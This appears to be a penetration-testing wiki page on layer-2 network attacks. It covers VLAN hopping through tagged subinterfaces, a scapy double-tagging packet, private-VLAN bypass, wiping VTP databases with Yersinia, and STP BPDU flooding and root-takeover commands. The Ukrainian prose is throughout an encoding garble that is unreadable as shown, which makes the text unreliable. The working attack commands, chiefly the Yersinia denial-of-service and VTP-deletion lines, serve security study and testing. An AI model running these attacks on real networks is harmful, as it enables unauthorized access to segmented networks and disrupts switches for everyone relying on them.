#### –ê—Ç–∞–∫–∞ –Ω–∞ –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ñ VLAN

–Ø–∫ —Ç—ñ–ª—å–∫–∏ –≤–∏ –¥—ñ–∑–Ω–∞—î—Ç–µ—Å—è —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä–∏ VLAN —Ç–∞ –∑–Ω–∞—á–µ–Ω–Ω—è IP, –≤–∏ –º–æ–∂–µ—Ç–µ **–Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ –≤—ñ—Ä—Ç—É–∞–ª—å–Ω–∏–π —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å –¥–ª—è –∞—Ç–∞–∫–∏ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–≥–æ VLAN**.\
–Ø–∫—â–æ DHCP –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∏–π, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ _ifconfig_ –¥–ª—è –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è —Å—Ç–∞—Ç–∏—á–Ω–æ—ó IP-–∞–¥—Ä–µ—Å–∏.
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### –ê–≤—Ç–æ–º–∞—Ç–∏—á–Ω–∏–π VLAN Hopper

–û–±–≥–æ–≤–æ—Ä—é–≤–∞–Ω–∞ –∞—Ç–∞–∫–∞ **–î–∏–Ω–∞–º—ñ—á–Ω–µ –∑'—î–¥–Ω–∞–Ω–Ω—è —Ç–∞ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –≤—ñ—Ä—Ç—É–∞–ª—å–Ω–∏—Ö —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å—ñ–≤ –¥–ª—è –≤–∏—è–≤–ª–µ–Ω–Ω—è —Ö–æ—Å—Ç—ñ–≤ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ** —ñ–Ω—à–∏—Ö VLAN –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—É: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### –ü–æ–¥–≤—ñ–π–Ω–µ —Ç–µ–≥—É–≤–∞–Ω–Ω—è

–Ø–∫—â–æ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑–Ω–∞—î –∑–Ω–∞—á–µ–Ω–Ω—è **MAC, IP —Ç–∞ VLAN ID —Ö–æ—Å—Ç–∞-–∂–µ—Ä—Ç–≤–∏**, –≤—ñ–Ω –º–æ–∂–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ **–ø–æ–¥–≤—ñ–π–Ω–æ –ø–æ–∑–Ω–∞—á–∏—Ç–∏ —Ñ—Ä–µ–π–º** –∑ –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∏–º –¥–ª—è –Ω—å–æ–≥–æ VLAN —Ç–∞ VLAN –∂–µ—Ä—Ç–≤–∏ —Ç–∞ –≤—ñ–¥–ø—Ä–∞–≤–∏—Ç–∏ –ø–∞–∫–µ—Ç. –û—Å–∫—ñ–ª—å–∫–∏ **–∂–µ—Ä—Ç–≤–∞ –Ω–µ –∑–º–æ–∂–µ –ø—ñ–¥–∫–ª—é—á–∏—Ç–∏—Å—è –Ω–∞–∑–∞–¥** –¥–æ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞, —Ç–æ **–Ω–∞–π–∫—Ä–∞—â–∏–π –≤–∞—Ä—ñ–∞–Ω—Ç –¥–ª—è –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞ - —Å–ø—ñ–ª–∫—É–≤–∞—Ç–∏—Å—è —á–µ—Ä–µ–∑ UDP** –∑ –ø—Ä–æ—Ç–æ–∫–æ–ª–∞–º–∏, —è–∫—ñ –º–æ–∂—É—Ç—å –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ —Ü—ñ–∫–∞–≤—ñ –¥—ñ—ó (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, SNMP).

–Ü–Ω—à–∞ –æ–ø—Ü—ñ—è –¥–ª—è –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞ - –∑–∞–ø—É—Å—Ç–∏—Ç–∏ **—Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è –ø–æ—Ä—Ç—ñ–≤ TCP, –ø—ñ–¥—Ä–æ–±–∏–≤—à–∏ IP, –∫–µ—Ä–æ–≤–∞–Ω–∏–π –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–æ–º —ñ –¥–æ—Å—Ç—É–ø–Ω–∏–π –¥–ª—è –∂–µ—Ä—Ç–≤–∏** (–º–∞–±—É—Ç—å —á–µ—Ä–µ–∑ –Ü–Ω—Ç–µ—Ä–Ω–µ—Ç). –ü–æ—Ç—ñ–º –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –ø–µ—Ä–µ—Ö–æ–ø–ª—é–≤–∞—Ç–∏ –ø–∞–∫–µ—Ç–∏ –≤ –¥—Ä—É–≥–æ–º—É —Ö–æ—Å—Ç—ñ, —è–∫–∏–π –Ω–∞–ª–µ–∂–∏—Ç—å –π–æ–º—É, —è–∫—â–æ –≤—ñ–Ω –æ—Ç—Ä–∏–º—É—î –¥–µ—è–∫—ñ –ø–∞–∫–µ—Ç–∏ –≤—ñ–¥ –∂–µ—Ä—Ç–≤–∏.

![](<../../.gitbook/assets/image (635) (1).png>)

–î–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —Ü—ñ—î—ó –∞—Ç–∞–∫–∏ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ scapy: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### –û–±—Ö—ñ–¥ –±–æ–∫–æ–≤–æ—ó —Å–µ–≥–º–µ–Ω—Ç–∞—Ü—ñ—ó VLAN <a href="#d679" id="d679"></a>

–Ø–∫—â–æ —É –≤–∞—Å —î **–¥–æ—Å—Ç—É–ø –¥–æ –∫–æ–º—É—Ç–∞—Ç–æ—Ä–∞, –¥–æ —è–∫–æ–≥–æ –≤–∏ –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –ø—ñ–¥–∫–ª—é—á–µ–Ω—ñ**, –≤–∏ –º–∞—î—Ç–µ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å **–æ–±—ñ–π—Ç–∏ —Å–µ–≥–º–µ–Ω—Ç–∞—Ü—ñ—é VLAN** –≤ –º–µ—Ä–µ–∂—ñ. –ü—Ä–æ—Å—Ç–æ **–ø–µ—Ä–µ–º–∫–Ω—ñ—Ç—å –ø–æ—Ä—Ç —É —Ä–µ–∂–∏–º —Ç—Ä–∞–Ω–∫–∞** (–≤—ñ–¥–æ–º–∏–π —è–∫ —Ç—Ä–∞–Ω–∫), —Å—Ç–≤–æ—Ä—ñ—Ç—å –≤—ñ—Ä—Ç—É–∞–ª—å–Ω—ñ —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∏ –∑ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä–∞–º–∏ —Ü—ñ–ª—å–æ–≤–∏—Ö VLAN —Ç–∞ –Ω–∞–ª–∞—à—Ç—É–π—Ç–µ IP-–∞–¥—Ä–µ—Å—É. –í–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –∑–∞–ø—Ä–æ—Å–∏—Ç–∏ –∞–¥—Ä–µ—Å—É –¥–∏–Ω–∞–º—ñ—á–Ω–æ (DHCP) –∞–±–æ –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ —ó—ó —Å—Ç–∞—Ç–∏—á–Ω–æ. –¶–µ –∑–∞–ª–µ–∂–∏—Ç—å –≤—ñ–¥ —Å–∏—Ç—É–∞—Ü—ñ—ó.

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### –û–±—Ö—ñ–¥ –ø—Ä–∏–≤–∞—Ç–Ω–æ—ó VLAN –Ω–∞ —Ä—ñ–≤–Ω—ñ 3

–£ –ø–µ–≤–Ω–∏—Ö —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞—Ö, —Ç–∞–∫–∏—Ö —è–∫ –≥–æ—Å—Ç—å–æ–≤—ñ –±–µ–∑–¥—Ä–æ—Ç–æ–≤—ñ –º–µ—Ä–µ–∂—ñ, –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è **—ñ–∑–æ–ª—è—Ü—ñ—ó –ø–æ—Ä—Ç—ñ–≤ (—Ç–∞–∫–æ–∂ –≤—ñ–¥–æ–º–µ —è–∫ –ø—Ä–∏–≤–∞—Ç–Ω–∞ VLAN)** –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –∑–∞–ø–æ–±—ñ–≥–∞–Ω–Ω—è –ø—Ä—è–º–æ–º—É —Å–ø—ñ–ª–∫—É–≤–∞–Ω–Ω—é –∫–ª—ñ—î–Ω—Ç—ñ–≤, –ø—ñ–¥–∫–ª—é—á–µ–Ω–∏—Ö –¥–æ —Ç–æ—á–∫–∏ –¥–æ—Å—Ç—É–ø—É –±–µ–∑–¥—Ä–æ—Ç–æ–≤–æ—ó –º–µ—Ä–µ–∂—ñ. –û–¥–Ω–∞–∫ –±—É–ª–∞ –≤–∏—è–≤–ª–µ–Ω–∞ —Ç–µ—Ö–Ω—ñ–∫–∞, —è–∫–∞ –º–æ–∂–µ –æ–±—ñ–π—Ç–∏ —Ü—ñ –∑–∞—Ö–æ–¥–∏ —ñ–∑–æ–ª—è—Ü—ñ—ó. –¶—è —Ç–µ—Ö–Ω—ñ–∫–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –∞–±–æ –≤—ñ–¥—Å—É—Ç–Ω—ñ—Å—Ç—å —Å–ø–∏—Å–∫—ñ–≤ –∫–µ—Ä—É–≤–∞–Ω–Ω—è –¥–æ—Å—Ç—É–ø–æ–º –º–µ—Ä–µ–∂—ñ, –∞–±–æ —ó—Ö –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω—É –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é, —â–æ –¥–æ–∑–≤–æ–ª—è—î –º–∞—Ä—à—Ä—É—Ç–∏–∑—É–≤–∞—Ç–∏ IP-–ø–∞–∫–µ—Ç–∏ —á–µ—Ä–µ–∑ –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ç–æ—Ä –¥–ª—è –¥–æ—Å—è–≥–Ω–µ–Ω–Ω—è —ñ–Ω—à–æ–≥–æ –∫–ª—ñ—î–Ω—Ç–∞ –≤ —Ç—ñ–π –∂–µ –º–µ—Ä–µ–∂—ñ.

–ê—Ç–∞–∫–∞ –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è —à–ª—è—Ö–æ–º —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è **–ø–∞–∫–µ—Ç–∞, —è–∫–∏–π –º—ñ—Å—Ç–∏—Ç—å IP-–∞–¥—Ä–µ—Å—É —Ü—ñ–ª—å–æ–≤–æ–≥–æ –∫–ª—ñ—î–Ω—Ç–∞, –∞–ª–µ –∑ MAC-–∞–¥—Ä–µ—Å–æ—é –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ç–æ—Ä–∞**. –¶–µ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ —Ç–æ–≥–æ, —â–æ –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ç–æ—Ä –ø–æ–º–∏–ª—è—î—Ç—å—Å—è, –ø–µ—Ä–µ—Å–∏–ª–∞—é—á–∏ –ø–∞–∫–µ—Ç –¥–æ —Ü—ñ–ª—å–æ–≤–æ–≥–æ –∫–ª—ñ—î–Ω—Ç–∞. –¶–µ–π –ø—ñ–¥—Ö—ñ–¥ —Å—Ö–æ–∂–∏–π –Ω–∞ —Ç–æ–π, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –≤ –∞—Ç–∞–∫–∞—Ö –∑ –ø–æ–¥–≤—ñ–π–Ω–∏–º —Ç–µ–≥—É–≤–∞–Ω–Ω—è–º, –¥–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –∫–µ—Ä—É–≤–∞—Ç–∏ —Ö–æ—Å—Ç–æ–º, –¥–æ —è–∫–æ–≥–æ –º–∞—î –¥–æ—Å—Ç—É–ø –∂–µ—Ä—Ç–≤–∞, –¥–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó —É—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –±–µ–∑–ø–µ–∫–∏.

**–û—Å–Ω–æ–≤–Ω—ñ –∫—Ä–æ–∫–∏ –∞—Ç–∞–∫–∏:**
1. **–°—Ç–≤–æ—Ä–µ–Ω–Ω—è –ø–∞–∫–µ—Ç–∞:** –ü–∞–∫–µ—Ç —Å–ø–µ—Ü—ñ–∞–ª—å–Ω–æ —Å—Ç–≤–æ—Ä—é—î—Ç—å—Å—è —Ç–∞–∫–∏–º —á–∏–Ω–æ–º, —â–æ–± –º—ñ—Å—Ç–∏—Ç–∏ IP-–∞–¥—Ä–µ—Å—É —Ü—ñ–ª—å–æ–≤–æ–≥–æ –∫–ª—ñ—î–Ω—Ç–∞, –∞–ª–µ –∑ MAC-–∞–¥—Ä–µ—Å–æ—é –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ç–æ—Ä–∞.
2. **–ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è –ø–æ–≤–µ–¥—ñ–Ω–∫–∏ –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ç–æ—Ä–∞:** –°—Ç–≤–æ—Ä–µ–Ω–∏–π –ø–∞–∫–µ—Ç –≤—ñ–¥–ø—Ä–∞–≤–ª—è—î—Ç—å—Å—è –¥–æ –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ç–æ—Ä–∞, —è–∫–∏–π, —á–µ—Ä–µ–∑ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é, –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è—î –ø–∞–∫–µ—Ç –¥–æ —Ü—ñ–ª—å–æ–≤–æ–≥–æ –∫–ª—ñ—î–Ω—Ç–∞, –æ–±—Ö–æ–¥—è—á–∏ —ñ–∑–æ–ª—è—Ü—ñ—é, –Ω–∞–¥–∞–Ω—É –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è–º–∏ –ø—Ä–∏–≤–∞—Ç–Ω–æ—ó VLAN.

### –ê—Ç–∞–∫–∏ –Ω–∞ VTP

VTP (VLAN Trunking Protocol) —Ü–µ–Ω—Ç—Ä–∞–ª—ñ–∑—É—î —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è VLAN. –í—ñ–Ω –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –Ω–æ–º–µ—Ä–∏ —Ä–µ–≤—ñ–∑—ñ–π –¥–ª—è –∑–±–µ—Ä–µ–∂–µ–Ω–Ω—è —Ü—ñ–ª—ñ—Å–Ω–æ—Å—Ç—ñ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö VLAN; –±—É–¥—å-—è–∫–∞ –º–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ—è –∑–±—ñ–ª—å—à—É—î —Ü–µ–π –Ω–æ–º–µ—Ä. –ö–æ–º—É—Ç–∞—Ç–æ—Ä–∏ –ø—Ä–∏–π–º–∞—é—Ç—å –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó –∑ –±—ñ–ª—å—à–∏–º–∏ –Ω–æ–º–µ—Ä–∞–º–∏ —Ä–µ–≤—ñ–∑—ñ–π, –æ–Ω–æ–≤–ª—é—é—á–∏ —Å–≤–æ—ó –≤–ª–∞—Å–Ω—ñ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö VLAN.

#### –†–æ–ª—ñ –¥–æ–º–µ–Ω—É VTP

- **–°–µ—Ä–≤–µ—Ä VTP:** –£–ø—Ä–∞–≤–ª—è—î VLAN ‚Äî —Å—Ç–≤–æ—Ä—é—î, –≤–∏–¥–∞–ª—è—î, –∑–º—ñ–Ω—é—î. –†–æ–∑—Å–∏–ª–∞—î –æ–≥–æ–ª–æ—à–µ–Ω–Ω—è VTP —á–ª–µ–Ω–∞–º –¥–æ–º–µ–Ω—É.
- **–ö–ª—ñ—î–Ω—Ç VTP:** –û—Ç—Ä–∏–º—É—î –æ–≥–æ–ª–æ—à–µ–Ω–Ω—è VTP –¥–ª—è —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—ó —Å–≤–æ—î—ó –±–∞–∑–∏ –¥–∞–Ω–∏—Ö VLAN. –¶—è —Ä–æ–ª—å –æ–±–º–µ–∂–µ–Ω–∞ –≤—ñ–¥ –ª–æ–∫–∞–ª—å–Ω–∏—Ö –º–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ–π –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó VLAN.
- **–ü—Ä–æ–∑–æ—Ä–∏–π VTP:** –ù–µ –±–µ—Ä–µ —É—á–∞—Å—Ç—ñ –≤ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è—Ö VTP, –∞–ª–µ –ø–µ—Ä–µ—Å–∏–ª–∞—î –æ–≥–æ–ª–æ—à–µ–Ω–Ω—è VTP. –ù–µ –ø—ñ–¥–¥–∞—î—Ç—å—Å—è –∞—Ç–∞–∫–∞–º VTP, –ø—ñ–¥—Ç—Ä–∏–º—É—î –ø–æ—Å—Ç—ñ–π–Ω–∏–π –Ω–æ–º–µ—Ä —Ä–µ–≤—ñ–∑—ñ—ó –Ω—É–ª—å.

#### –¢–∏–ø–∏ –æ–≥–æ–ª–æ—à–µ–Ω—å VTP

- **–û–≥–æ–ª–æ—à–µ–Ω–Ω—è –∑–∞–≥–∞–ª—å–Ω–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó:** –†–æ–∑—Å–∏–ª–∞—î—Ç—å—Å—è —Å–µ—Ä–≤–µ—Ä–æ–º VTP –∫–æ–∂–Ω—ñ 300 —Å–µ–∫—É–Ω–¥, –Ω–µ—Å—É—á–∏ –≤–∞–∂–ª–∏–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –¥–æ–º–µ–Ω—É.
- **–û–≥–æ–ª–æ—à–µ–Ω–Ω—è –ø—ñ–¥–º–Ω–æ–∂–∏–Ω–∏:** –ù–∞–¥—Å–∏–ª–∞—î—Ç—å—Å—è –ø—ñ—Å–ª—è –∑–º—ñ–Ω –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó VLAN.
- **–ó–∞–ø–∏—Ç –æ–≥–æ–ª–æ—à–µ–Ω–Ω—è:** –í–∏–¥–∞–Ω–æ –∫–ª—ñ—î–Ω—Ç–æ–º VTP –¥–ª—è –∑–∞–ø–∏—Ç—É –æ–≥–æ–ª–æ—à–µ–Ω–Ω—è –∑–∞–≥–∞–ª—å–Ω–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó, –∑–∞–∑–≤–∏—á–∞–π —É –≤—ñ–¥–ø–æ–≤—ñ–¥—å –Ω–∞ –≤–∏—è–≤–ª–µ–Ω–Ω—è –±—ñ–ª—å—à –≤–∏—Å–æ–∫–æ–≥–æ –Ω–æ–º–µ—Ä–∞ —Ä–µ–≤—ñ–∑—ñ—ó –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó.

–£—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ VTP –º–æ–∂–Ω–∞ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ –≤–∏–∫–ª—é—á–Ω–æ —á–µ—Ä–µ–∑ —Ç—Ä–∞–Ω–∫-–ø–æ—Ä—Ç–∏, –æ—Å–∫—ñ–ª—å–∫–∏ –æ–≥–æ–ª–æ—à–µ–Ω–Ω—è VTP —Ü–∏—Ä–∫—É–ª—é—é—Ç—å –ª–∏—à–µ —á–µ—Ä–µ–∑ –Ω–∏—Ö. –°—Ü–µ–Ω–∞—Ä—ñ—ó –∞—Ç–∞–∫ –ø—ñ—Å–ª—è –∞—Ç–∞–∫–∏ DTP –º–æ–∂—É—Ç—å –ø–µ—Ä–µ—Ö–æ–¥–∏—Ç–∏ –¥–æ VTP. –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏, —Ç–∞–∫—ñ —è–∫ Yersinia, –º–æ–∂—É—Ç—å —Å–ø—Ä–∏—è—Ç–∏ –∞—Ç–∞–∫–∞–º –Ω–∞ VTP, —Å–ø—Ä—è–º–æ–≤–∞–Ω–∏–º –Ω–∞ –≤–∏–¥–∞–ª–µ–Ω–Ω—è –±–∞–∑–∏ –¥–∞–Ω–∏—Ö VLAN, –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ –Ω–∞—Ä—É—à—É—é—á–∏ –º–µ—Ä–µ–∂—É.

–ü—Ä–∏–º—ñ—Ç–∫–∞: –¶—è –¥–∏—Å–∫—É—Å—ñ—è —Å—Ç–æ—Å—É—î—Ç—å—Å—è VTP –≤–µ—Ä—Å—ñ—ó 1 (VTPv1).
```bash
%% yersinia -G # Launch Yersinia in graphical mode ```
```
–£ –≥—Ä–∞—Ñ—ñ—á–Ω–æ–º—É —Ä–µ–∂–∏–º—ñ Yersinia –≤–∏–±–µ—Ä—ñ—Ç—å –æ–ø—Ü—ñ—é –≤–∏–¥–∞–ª–µ–Ω–Ω—è –≤—Å—ñ—Ö VTP –≤–ª–∞–Ω—ñ–≤ –¥–ª—è –æ—á–∏—â–µ–Ω–Ω—è –±–∞–∑–∏ –¥–∞–Ω–∏—Ö VLAN.

### –ê—Ç–∞–∫–∏ STP

**–Ø–∫—â–æ –≤–∏ –Ω–µ –º–æ–∂–µ—Ç–µ –∑–∞—Ö–æ–ø–∏—Ç–∏ —Ñ—Ä–µ–π–º–∏ BPDU –Ω–∞ —Å–≤–æ—ó—Ö —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞—Ö, –π–º–æ–≤—ñ—Ä–Ω–æ, –≤–∞–º –Ω–µ –≤–¥–∞—Å—Ç—å—Å—è —É—Å–ø—ñ—à–Ω–æ –≤–∏–∫–æ–Ω–∞—Ç–∏ –∞—Ç–∞–∫—É STP.**

#### **STP BPDU DoS**

–í—ñ–¥–ø—Ä–∞–≤–ª—è—é—á–∏ –±–∞–≥–∞—Ç–æ BPDUs TCP (–ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –ø—Ä–æ –∑–º—ñ–Ω—É —Ç–æ–ø–æ–ª–æ–≥—ñ—ó) –∞–±–æ Conf (BPDUs, —è–∫—ñ –≤—ñ–¥–ø—Ä–∞–≤–ª—è—é—Ç—å—Å—è –ø—Ä–∏ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—ñ —Ç–æ–ø–æ–ª–æ–≥—ñ—ó), –∫–æ–º—É—Ç–∞—Ç–æ—Ä–∏ –ø–µ—Ä–µ–≤–∞–Ω—Ç–∞–∂—É—é—Ç—å—Å—è —ñ –ø–µ—Ä–µ—Å—Ç–∞—é—Ç—å –ø—Ä–∞—Ü—é–≤–∞—Ç–∏ –ø—Ä–∞–≤–∏–ª—å–Ω–æ.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **–ê—Ç–∞–∫–∞ STP TCP**

–ö–æ–ª–∏ –≤—ñ–¥–ø—Ä–∞–≤–ª—è—î—Ç—å—Å—è TCP, —Ç–∞–±–ª–∏—Ü—è CAM –∫–æ–º—É—Ç–∞—Ç–æ—Ä—ñ–≤ –±—É–¥–µ –≤–∏–¥–∞–ª–µ–Ω–∞ —á–µ—Ä–µ–∑ 15 —Å. –ü–æ—Ç—ñ–º, —è–∫—â–æ –≤–∏ –Ω–∞–¥—Å–∏–ª–∞—î—Ç–µ –±–µ–∑–ø–µ—Ä–µ—Ä–≤–Ω–æ —Ü–µ–π —Ç–∏–ø –ø–∞–∫–µ—Ç—ñ–≤, —Ç–∞–±–ª–∏—Ü—è CAM –±—É–¥–µ –ø–æ—Å—Ç—ñ–π–Ω–æ –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫–∞—Ç–∏—Å—è (–∞–±–æ –∫–æ–∂–Ω—ñ 15 —Å), —ñ –∫–æ–ª–∏ –≤–æ–Ω–∞ –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫–∞—î—Ç—å—Å—è, –∫–æ–º—É—Ç–∞—Ç–æ—Ä –≤–µ–¥–µ —Å–µ–±–µ —è–∫ –∫–æ–Ω—Ü–µ–Ω—Ç—Ä–∞—Ç–æ—Ä.
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **–ê—Ç–∞–∫–∞ –Ω–∞ –∫–æ—Ä—ñ–Ω—å STP**

–ê—Ç–∞–∫—É–≤–∞–ª—å–Ω–∏–∫ —Å–∏–º—É–ª—é—î –ø–æ–≤–µ–¥—ñ–Ω–∫—É –∫–æ–º—É—Ç–∞—Ç–æ—Ä–∞, —â–æ–± —Å—Ç–∞—Ç–∏ –∫–æ—Ä–µ–Ω–µ–º STP –º–µ—Ä–µ–∂—ñ. –ü—ñ—Å–ª—è —Ü—å–æ–≥–æ —á–µ—Ä–µ–∑ –Ω—å–æ–≥–æ –±—É–¥–µ –ø—Ä–æ—Ö–æ–¥–∏—Ç–∏ –±—ñ–ª—å—à–µ –¥–∞–Ω–∏—Ö. –¶–µ —Ü—ñ–∫–∞–≤–æ, –∫–æ–ª–∏ –≤–∏ –ø—ñ–¥–∫–ª—é—á–µ–Ω—ñ –¥–æ –¥–≤–æ—Ö —Ä—ñ–∑–Ω–∏—Ö –∫–æ–º—É—Ç–∞—Ç–æ—Ä—ñ–≤.\
–¶–µ —Ä–æ–±–∏—Ç—å—Å—è —à–ª—è—Ö–æ–º –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–Ω—è –ø–∞–∫–µ—Ç—ñ–≤ CONF BPDUs, –≤ —è–∫–∏—Ö –≤–∫–∞–∑—É—î—Ç—å—Å—è, —â–æ –∑–Ω–∞—á–µ–Ω–Ω—è **–ø—Ä—ñ–æ—Ä–∏—Ç–µ—Ç—É** –º–µ–Ω—à–µ, –Ω—ñ–∂ —Ñ–∞–∫—Ç–∏—á–Ω–∏–π –ø—Ä—ñ–æ—Ä–∏—Ç–µ—Ç –ø–æ—Ç–æ—á–Ω–æ–≥–æ –∫–æ—Ä–µ–Ω–µ–≤–æ–≥–æ –∫–æ–º—É—Ç–∞—Ç–æ—Ä–∞.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
